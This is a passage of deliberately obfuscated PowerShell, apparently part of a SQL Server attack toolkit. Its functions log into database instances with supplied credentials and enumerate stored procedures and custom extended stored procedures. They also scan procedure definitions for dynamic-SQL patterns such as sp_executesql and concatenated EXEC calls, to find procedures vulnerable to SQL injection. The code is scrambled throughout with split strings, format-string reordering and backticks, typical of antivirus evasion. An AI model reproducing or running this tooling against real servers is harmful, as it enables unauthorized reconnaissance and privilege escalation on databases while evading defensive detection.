 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SELE'+'CT '+' '+"'$ComputerName' "+'as'+' '+'[Com'+'p'+'uter'+'Name],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[I'+'nstanc'+'e],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROU'+'TINE_CA'+'TALOG'+' '+'AS'+' '+'['+'D'+'atabaseN'+'ame],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'OUTINE'+'_SCH'+'EMA '+'A'+'S '+'[Sc'+'hemaNa'+'m'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'O'+'UTINE'+'_NA'+'ME '+'as'+' '+'['+'Pr'+'o'+'cedureName'+']'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROU'+'TINE_TYP'+'E '+'a'+'s '+'['+'P'+'rocedur'+'eType],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'RO'+'U'+'TINE'+'_'+'DEF'+'INITION '+'a'+'s '+'[Pr'+'ocedureDe'+'finiti'+'on'+'],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SQL'+'_'+'D'+'ATA_ACCES'+'S,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROUTIN'+'E'+'_'+'BOD'+'Y,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'C'+'REA'+'TED,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'LAS'+'T_ALTE'+'R'+'E'+'D,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'b'+'.is_'+'ms'+'_shi'+'pp'+'ed,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'b.is_au'+'to_'+'ex'+'ec'+'ut'+'e'+'d
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'F'+'ROM '+'[I'+'NFORMATIO'+'N_SCHEMA].'+'['+'RO'+'UT'+'INES] '+'a
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'JOIN'+' '+'['+'sys].[p'+'roced'+'ur'+'es] '+' '+'b'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+'a'+'.ROUTIN'+'E'+'_N'+'AME '+'= '+'b.name'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHE'+'RE'+' '+'1='+'1
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$AutoExecFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$ProcedureNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$KeywordFilter")

            
            ${tB`l`pr`O`cSTemP} = &("{2}{1}{3}{0}"-f 'ery','e','G','t-SQLQu') -Instance ${in`S`TanCe} -Query ${QU`eRy} -Username ${US`eRna`Me} -Password ${Pass`w`oRd} -Credential ${c`ReD`EnTiAl} -SuppressVerbose

            
            ${Tb`l`PrOCS} = ${T`BL`Pr`oCS} + ${tB`LprOc`S`TEMp}
        }
    }

    End
    {
        
        ${Tb`L`PrOcS}
    }
}






Function  G`e`T`-SQlsTor`eD`p`ROcEdUrExp
{
    

    [CmdletBinding()]
    Param(
        [Parameter(MAndatorY = ${FAL`sE},
        hElPmESsaGE = {"{11}{10}{5}{12}{6}{4}{8}{9}{1}{7}{2}{0}{3}"-f'it','to a','icate w','h.','r domain','erv','o','uthent',' acco','unt ','QL S','S','er '})]
        [string]${uS`ER`NamE},

        [Parameter(mAnDAtorY = ${F`Alse},
        heLPmESsagE = {"{10}{7}{8}{2}{6}{4}{9}{5}{0}{3}{11}{1}"-f'au','ate with.','ou','th','t pass','d to ','n',' ','domain acc','wor','SQL Server or','entic'})]
        [string]${p`AsSwo`Rd},

        [Parameter(maNdatoRy = ${f`ALse},
        hELPmEssaGE = {"{4}{2}{3}{0}{1}"-f ' cre','dentials.','ndow','s','Wi'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cReD`entI`Al} =   (  VarIabLE  ('04'+'59m2')  -VAlueoN)::"EMP`Ty",

        [Parameter(mANdatORy = ${F`AL`SE},
                ValUEfrOmPIPelIneBYproperTynAme = ${T`Rue},
        heLpMessaGe = {"{6}{2}{3}{0}{1}{4}{7}{5}"-f' ins','ta','L Ser','ver','nce to ','ion to.','SQ','connect'})]
        [string]${iN`STAN`ce},

        [Parameter(mAndATOry = ${fAL`SE},
                VaLUEFrompIpelINEByPRopeRTynamE = ${Tr`UE},
        helpmesSAgE = {"{2}{3}{1}{0}{4}" -f 'databas','ver ','SQL',' Ser','e name.'})]
        [string]${dAt`AB`AS`e`NaMe},

        [Parameter(manDAtORy = ${fAl`sE},
                valuefrOmpIpElINebyPrOPeRtYnAmE = ${T`Rue},
        HeLpmeSsagE = {"{1}{0}{2}{3}" -f 'ce','Pro','du','re name.'})]
        [string]${PROce`duR`EName},

        [Parameter(manDAtOrY = ${Fa`lSe},
        HelpmESsAGe = {(("{7}{3}{2}{4}{6}{8}{9}{0}{5}{1}{10}" -f'd','d','ect t','TGt sel','ab','efault ','les fr','Don1','om',' ','atabases.'))  -creplACe'1TG',[CHaR]39})]
        [switch]${noDEFa`U`lts},

        [Parameter(mandaToRy = ${faL`SE},
        HELpMeSSaGe = {"{2}{0}{12}{10}{4}{14}{1}{7}{13}{5}{8}{6}{3}{11}{9}" -f 'uppress ',' erro','S','rap','r','tion ','s w','rs.  Used whe','i','d.','e','pe','v','n func','bose'})]
        [switch]${SUPprES`S`V`ErBo`Se}
    )

    Begin
    {
        
        ${t`Blx`PPR`ocS} = &("{2}{1}{0}{3}" -f'b','ew-O','N','ject') -TypeName ("{2}{3}{5}{0}{1}{4}" -f 'em.Data.D','ataTa','Sy','s','ble','t')

        
        if (${P`Roc`e`duRE`NAME})
        {
            ${P`RO`Ced`UrEnAmefiLt`eR} = (' '+'AND'+' '+'NAME'+' '+'l'+'ike '+"'$ProcedureName'")
        }
        else
        {
            ${PROce`durENa`meFiL`TeR} = ''
        }
    }

    Process
    {
        
        If (${I`NST`ANCe})
        {
            ${C`Ompu`TE`Rna`ME} = ${IN`S`TanCE}.("{0}{1}" -f 'spli','t').Invoke('\')[0].("{0}{1}"-f'spli','t').Invoke(',')[0]
            ${iNSt`AnCe} = ${I`NSt`AncE}
        }
        else
        {
            ${co`M`pute`R`NAme} = ${eNV`:c`oM`pUTernA`Me}
            ${InSt`ANcE} = '.\'
        }

        
        ${TeS`TcoN`NEcT`I`oN} = &("{5}{3}{1}{4}{0}{2}"-f'ectionTes','L','t','Q','Conn','Get-S') -Instance ${iNSTA`N`cE} -Username ${uSer`N`AMe} -Password ${p`ASswoRd} -Credential ${CREdE`N`T`iaL} -SuppressVerbose | &("{3}{0}{2}{1}" -f're-Obj','ct','e','Whe') -FilterScript {
            ${_}."St`AT`Us" -eq ("{2}{0}{1}"-f 'ssib','le','Acce')
        }
        if(${tEstCo`NNE`CT`iON})
        {
            if( -not ${SU`PP`RE`SSVeRbO`se})
            {
                &("{1}{3}{2}{0}" -f'se','Writ','rbo','e-Ve') -Message ("$Instance "+': '+'Connecti'+'on'+' '+'S'+'u'+'ccess.')
                &("{0}{1}{2}"-f'Wr','it','e-Verbose') -Message ("$Instance "+': '+'G'+'rabb'+'ing '+'st'+'ored '+'proced'+'ure'+'s '+'fr'+'om '+'d'+'atabase'+'s '+'bel'+'ow:')
            }
        }
        else
        {
            if( -not ${sup`Pres`sve`RbO`Se})
            {
                &("{1}{0}{2}" -f'rite-V','W','erbose') -Message ("$Instance "+': '+'Conne'+'c'+'tion '+'Fai'+'led.')
            }
            return
        }

        
        if(${noDeF`A`UltS})
        {
            
            ${T`BLDATAB`As`Es} = &("{0}{1}{2}{3}" -f'Get-SQLDat','a','b','ase') -Instance ${INSTA`NcE} -Username ${u`Ser`NA`me} -Password ${PaSS`wo`Rd} -Credential ${c`RedeN`TIal} -DatabaseName ${dAt`Ab`ASe`Na`ME} -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            
            ${Tbl`Da`TABa`SEs} = &("{1}{2}{3}{0}" -f'abase','Get-S','QL','Dat') -Instance ${inSTA`N`Ce} -Username ${u`S`eRN`AMe} -Password ${pAS`Sw`orD} -Credential ${cR`eD`entIaL} -DatabaseName ${d`ATABAS`eN`A`ME} -HasAccess -SuppressVerbose
        }

        
        ${Tbl`dAtAB`AsES} |
        &("{1}{4}{2}{0}{3}"-f 'Obje','ForE','h-','ct','ac') -Process {
            
            ${D`BnaMe} = ${_}."da`TA`BASeNAme"

            if( -not ${Su`pprEsSVERb`O`SE})
            {
                &("{2}{1}{0}"-f 'ose','te-Verb','Wri') -Message ("$Instance "+': '+'- '+"$DbName")
            }

            
            ${q`U`eRY} = (' '+' '+'us'+'e '+"[$DbName];
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'ELECT '+"'$ComputerName' "+'as'+' '+'[Compute'+'rNa'+'m'+'e'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'['+'In'+'stance]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$DbName' "+'a'+'s '+'[Data'+'baseN'+'ame]'+', '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o.obj'+'ec'+'t_id,
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o.pare'+'nt_'+'o'+'b'+'je'+'ct_id,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o.schem'+'a_id'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'c.nam'+'e '+'AS'+' '+'sch'+'ema_n'+'ame,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o.ty'+'p'+'e,
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o'+'.type_'+'desc'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o.nam'+'e,
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o.pri'+'n'+'cipal_'+'i'+'d,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.'+'text,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CAST('+'s.c'+'te'+'xt '+'AS'+' '+'NVA'+'RC'+'HAR(MA'+'X'+')) '+'AS'+' '+'c'+'tex'+'t,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.s'+'tatu'+'s,
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o.'+'cre'+'a'+'te_date,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o'+'.modify_dat'+'e,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o'+'.is_'+'ms_shippe'+'d,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o'+'.is_pu'+'b'+'li'+'s'+'hed,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o.is_sche'+'m'+'a_'+'p'+'ublished,'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.co'+'lid'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.compres'+'s'+'ed,'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.e'+'ncrypted'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.id'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.l'+'angu'+'age,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.n'+'umb'+'er,'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.'+'textty'+'p'+'e
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'F'+'ROM '+'s'+'ys.'+'obj'+'ects '+'o
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'I'+'N'+'NER '+'JOI'+'N '+'sys.sy'+'scomment'+'s '+'s '+'ON'+' '+'o.o'+'bject'+'_id '+'= '+'s.id
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'INNE'+'R '+'JOIN'+' '+'s'+'ys.s'+'chemas '+'s'+'c '+'ON'+' '+'o.'+'sche'+'ma_'+'id '+'= '+'sc'+'.sc'+'h'+'em'+'a_id
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'W'+'H'+'ERE '+'o.ty'+'pe'+' '+'= '+('{'+'0}'+'x{0'+'}
 ') -F  [ChAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$ProcedureNameFilter")

            
            ${tBLx`PPrO`cS`TEMP} = &("{2}{1}{0}" -f 'uery','-SQLQ','Get') -Instance ${I`NstA`NCe} -Query ${Qu`ERy} -Username ${USEr`NA`ME} -Password ${paSs`w`orD} -Credential ${Cre`DENTI`Al} -SuppressVerbose

            
            ${TbL`X`PPr`ocs} = ${t`BLXp`PROCs} + ${TbLX`Ppro`c`S`TEmP}
        }
    }

    End
    {

        
        ${Xpn`Um} = ${t`BL`Xp`PrOcS}."cO`UNT"
        if(${x`pnuM} -eq 0){

            if( -not ${s`UPP`ReSSveR`B`OsE})
            {
                &("{2}{0}{1}{3}" -f 'Ve','rbo','Write-','se') -Message ("$Instance "+': '+'No'+' '+'custo'+'m'+' '+'ex'+'t'+'ended '+'sto'+'red'+' '+'p'+'r'+'oced'+'ures '+'fo'+'und.')
            }
        }

        
        ${t`BLX`p`Procs}
    }
}









Function  Get-`sqLS`TOREdpRo`CeduR`eSQli
{
    

    [CmdletBinding()]
    Param(
        [Parameter(maNDaTORy = ${Fa`L`Se},
        HELpMessaGe = {"{11}{3}{6}{0}{7}{2}{5}{9}{12}{13}{4}{14}{10}{8}{1}" -f 've','h.',' domai','QL','c','n',' Ser','r or','e wit',' account to au','t','S','t','henti','a'})]
        [string]${US`eR`NA`mE},

        [Parameter(mANdaTOry = ${f`AL`SE},
        HElpmeSSaGe = {"{11}{4}{2}{3}{10}{1}{0}{7}{12}{6}{5}{8}{9}"-f 'sword','r domain account pas','r','v','Se','nticate','uthe',' to',' ','with.','er o','SQL ',' a'})]
        [string]${pASs`W`ord},

        [Parameter(mANdAToRy = ${fa`lse},
        hELPmEsSAGe = {"{4}{5}{3}{1}{0}{2}" -f 'r',' c','edentials.','ws','Win','do'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cReD`eNtI`Al} =  (  Gi  vArIaBLe:0459M2).vaLUE::"eMP`Ty",

        [Parameter(mandatOrY = ${Fa`LSe},
                VAlUeFrOMpIpELiNEByPrOPERTyNAMe = ${T`RUE},
        heLpMesSAGe = {"{7}{6}{4}{5}{0}{2}{3}{1}"-f 'nn','on to.','ec','ti','nstan','ce to co',' i','SQL Server'})]
        [string]${i`Ns`Tance},

        [Parameter(MAnDAtorY = ${f`AL`SE},
                ValUeFRompIpeLInEBypRoPertYNAmE = ${T`RUe},
        hELPMEssaGE = {"{4}{3}{0}{2}{1}{6}{5}"-f ' S','er dat','erv','L','SQ','ase name.','ab'})]
        [string]${dAtaB`A`SEn`AmE},

        [Parameter(MandaTorY = ${f`AlSe},
                VAlUEFrOMPipELINEbypRoPErTynAme = ${t`RUe},
        HELPMESsAGE = {"{4}{0}{2}{3}{1}" -f 'cedure','.',' nam','e','Pro'})]
        [string]${PROC`EdUr`ENAME},

        [Parameter(MAnDatory = ${FA`lSe},
                VALUEfROmPIPEliNebyPROpErTYNAme = ${T`RUe},
        heLPmeSSAgE = {"{7}{6}{5}{1}{9}{3}{10}{4}{12}{2}{11}{8}{0}" -f 'rd.','c',' ke','es ','e','pro',' ','Filter for','wo','edur','that includ','y',' the'})]
        [string]${KE`Y`wOrd},
        
        [Parameter(MaNdatory = ${fal`Se},
                ValuefroMpIPElInebYPRoperTYNAmE = ${T`Rue},
        HelpMEsSaGE = {"{3}{2}{4}{7}{6}{1}{5}{0}" -f 's.','du','ter f','Fil','o','re','ned proce','r sig'})]
        [switch]${o`NLYSIGN`Ed},

        [Parameter(mAndaTORY = ${FA`l`sE},
        HELPmESSaGE = {"{5}{6}{7}{4}{11}{3}{9}{10}{1}{8}{2}{0}{12}"-f 'service start','when ','erver ','d t','p','O','nly incl','ude ','SQL S','o execut','e ','rocedures configure','s.'})]
        [switch]${Au`T`OexEC},

        [Parameter(MaNDAtOrY = ${fal`sE},
        HElPMEssAgE = {(("{5}{1}{2}{4}{6}{7}{0}{8}{3}" -f'm default da','Oz','t se','es.','lect tables','Doni',' ','fro','tabas')) -CRePlace  ([Char]105+[Char]79+[Char]122),[Char]39})]
        [switch]${NOde`FA`UltS},

        [Parameter(mANdaTORY = ${fa`LsE},
        heLPMEssagE = {"{5}{3}{7}{10}{9}{6}{11}{8}{4}{2}{1}{0}"-f's wrapped.','n i','unctio','ppres',' f','Su','d','s verbose e','en','rors.  Use','r',' wh'})]
        [switch]${sUP`p`R`ESsv`ERboSE}
    )

    Begin
    {
        
        ${tbl`PR`ocs} = &("{2}{0}{1}"-f '-Obje','ct','New') -TypeName ("{0}{4}{1}{3}{2}{6}{5}" -f'S','t','a.','em.Dat','ys','le','DataTab')

        
        if (${ProCe`Dur`E`NaME})
        {
            ${P`RoC`ED`U`REnameF`iLT`ER} = (' '+'AN'+'D '+'ROUT'+'I'+'NE_NA'+'ME '+'lik'+'e '+"'$ProcedureName'")
        }
        else
        {
            ${pRo`ced`UReNam`ef`Il`TeR} = ''
        }

        
        if (${KEY`w`OrD})
        {
            ${KeYwOrDf`il`T`ER} = (' '+'AND'+' '+'RO'+'UTI'+'N'+'E_DEF'+'INIT'+'ION '+'l'+'ike '+"'%$Keyword%'")
        }
        else
        {
            ${kEy`W`ORdfIL`TeR} = ''
        }

        
        if (${A`Utoe`Xec})
        {
            ${A`UtO`exec`FILtEr} = ("{4}{1}{2}{3}{0}"-f 'd = 1','s_','auto_execu','te',' AND i')
        }
        else
        {
            ${autoe`xEC`FiLteR} = ''
        }
    }

    Process
    {
        
        If (${I`N`sTAncE})
        {
            ${coMpu`TeRn`AMe} = ${in`S`TancE}.("{1}{0}"-f 'plit','s').Invoke('\')[0].("{0}{1}"-f 's','plit').Invoke(',')[0]
            ${inst`A`NCe} = ${iN`s`T`ANcE}
        }
        else
        {
            ${C`O`mPut`erName} = ${EnV`:c`O`Mpu`TeRNA`me}
            ${I`Nstan`ce} = '.\'
        }

        
        ${te`StConn`eCTION} = &("{1}{3}{0}{2}" -f'o','Get-SQLCon','nTest','necti') -Instance ${ins`T`Ance} -Username ${u`s`eRnA`ME} -Password ${Pass`wOrd} -Credential ${CREd`ent`i`Al} -SuppressVerbose | &("{3}{0}{1}{2}"-f 'r','e-Obje','ct','Whe') -FilterScript {
            ${_}."s`TaTUs" -eq ("{0}{2}{1}"-f 'Acces','ble','si')
        }
        if(${T`eSTcoNn`Ecti`ON})
        {
            if( -not ${SUpPRES`sVE`R`Bo`se})
            {
                &("{2}{0}{1}" -f'rbos','e','Write-Ve') -Message ("$Instance "+': '+'Conne'+'c'+'ti'+'on '+'Su'+'ccess'+'.')
                &("{1}{0}{2}" -f'os','Write-Verb','e') -Message ("$Instance "+': '+'Che'+'cki'+'ng '+'d'+'ataba'+'ses '+'be'+'low'+' '+'fo'+'r '+'vuln'+'e'+'rab'+'le '+'store'+'d '+'p'+'ro'+'cedures:')
            }
        }
        else
        {
            if( -not ${s`UpP`ResSvERBOsE})
            {
                &("{0}{2}{1}"-f'W','rbose','rite-Ve') -Message ("$Instance "+': '+'Connec'+'t'+'io'+'n '+'F'+'ail'+'ed.')
            }
            return
        }

        
        if(${NOde`FA`U`lTs})
        {
            
            ${tbldat`AB`AsES} = &("{2}{4}{1}{0}{3}"-f 'as','tab','G','e','et-SQLDa') -Instance ${in`s`TANce} -Username ${US`eRnaME} -Password ${PaSs`woRD} -Credential ${cRedE`N`Tial} -DatabaseName ${datA`B`ASENaME} -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            
            ${t`BldaTAb`AsEs} = &("{0}{1}{2}"-f 'Get-S','QLDatab','ase') -Instance ${i`NstA`NCe} -Username ${uSeRnA`mE} -Password ${paS`s`Word} -Credential ${cr`ed`EnT`Ial} -DatabaseName ${Dat`ABASe`Na`me} -HasAccess -SuppressVerbose
        }

        
        ${Tb`LdAta`BasEs} |
        &("{3}{2}{0}{1}"-f'O','bject','ch-','ForEa') -Process {
            
            ${D`Bna`me} = ${_}."DAta`B`ASenAmE"

            if( -not ${SUPPr`E`sS`VErBOSe})
            {

                &("{3}{1}{0}{2}" -f'e-V','it','erbose','Wr') -Message ("$Instance "+': '+'- '+'Ch'+'ec'+'king '+"$DbName "+'data'+'b'+'ase...')

            }

            
            ${qu`Ery} = (' '+' '+'use'+' '+"[$DbName];
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SELECT'+' '+' '+"'$ComputerName' "+'as'+' '+'[Co'+'mpute'+'rName'+']'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'['+'I'+'ns'+'tance],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROU'+'TINE_'+'C'+'ATALOG '+'A'+'S '+'[Dat'+'a'+'baseName],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'OUTINE_'+'SCHEMA '+'A'+'S '+'[Sc'+'hema'+'Name'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'RO'+'U'+'TINE_'+'NAM'+'E '+'as'+' '+'[Proc'+'edure'+'N'+'ame],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROU'+'TINE_'+'TYPE'+' '+'a'+'s '+'[Pr'+'oced'+'ureType],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'OUT'+'INE_DE'+'F'+'I'+'NITION '+'a'+'s '+'[Pr'+'oc'+'edureD'+'e'+'f'+'i'+'niti'+'on],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SQL'+'_'+'DATA'+'_A'+'CCES'+'S,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'RO'+'U'+'TINE_'+'BODY,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CRE'+'ATED'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'LAST_ALTE'+'RED'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'b.'+'is_'+'m'+'s_'+'s'+'hipped,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'b.'+'is_au'+'to_e'+'xecuted
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FR'+'OM '+'[IN'+'FORMATIO'+'N_SCH'+'EMA].[RO'+'UTINE'+'S]'+' '+'a
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'JOIN'+' '+'[sy'+'s'+'].[p'+'ro'+'c'+'edures] '+' '+'b
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+'a.RO'+'UTI'+'NE_N'+'AME'+' '+'= '+'b.n'+'am'+'e
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHE'+'RE '+'1'+'=1 '+'AN'+'D '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(ROUT'+'INE_D'+'EFINIT'+'ION '+'li'+'ke '+(('Tnv%sp_exec'+'u'+'tes'+'ql'+'%'+'Tnv ')  -rEPlAcE'Tnv',[cHAR]39)+'OR'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROUTINE_DEF'+'INI'+'TIO'+'N '+'like'+' '+('{0}%s'+'p_'+'sq'+'lex'+'ec'+'%'+'{0} ')  -F[Char]39+'O'+'R
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'OUTIN'+'E_D'+'E'+'FINITION '+'like'+' '+('Ip'+'O%'+'exec ')."REp`laCe"('IpO',[STring][chaR]39)+(('@%'+'ZwD ')-cREPLACE'ZwD',[chAR]39)+'OR
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'OUT'+'IN'+'E_D'+'EFI'+'NITION '+'li'+'ke '+(('I'+'ej%'+'execu'+'te ')-CRePlacE 'Iej',[cHaR]39)+('@%{'+'0} ') -f[ChaR]39+'O'+'R
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROUTINE_DEFIN'+'I'+'TI'+'ON '+'l'+'ike '+(('BC'+'m%exec'+' ')  -CrEpLace  'BCm',[chaR]39)+('(%'+'{0} ')  -f[chAR]39+'OR
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'OUTI'+'NE_DEFINITIO'+'N'+' '+'l'+'ike '+('c'+'rS'+'%'+'exec('+'%cr'+'S ')."REPl`A`Ce"('crS',[STRinG][CHAR]39)+'O'+'R
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROU'+'T'+'INE'+'_'+'DEFINITION '+'l'+'ike '+(('DVC%exec'+'u'+'te ')  -rEplACE([CHar]68+[CHar]86+[CHar]67),[CHar]39)+('('+'%kGL ')."rEp`La`ce"('kGL',[STRiNG][CHAr]39)+'OR'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'O'+'UTINE'+'_DEFIN'+'ITION '+'li'+'ke '+('kJr'+'%'+'ex'+'ecute(%kJr ')."RePL`AcE"('kJr',[string][char]39)+'OR
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'OU'+'TINE'+'_'+'DEFINITION '+'lik'+'e '+('txB%txBtx'+'B'+'txBtxB'+'tx'+'B'+'tx'+'B+%'+'txB ')."r`epLACe"('txB',[STrINg][CHaR]39)+'OR'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROU'+'TINE_DEF'+'I'+'NITIO'+'N'+' '+'l'+'ike '+(('ILl%I'+'L'+'lIL'+'lIL'+'lILl'+'ILl'+'I'+'Ll ') -CrEplAcE'ILl',[chAr]39)+(('+%u'+'3W)'+' ')-cRepLaCE  'u3W',[char]39)+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'A'+'ND '+'ROUTI'+'NE'+'_DE'+'FINITI'+'ON'+' '+'lik'+'e '+('{0}%+%'+'{'+'0}
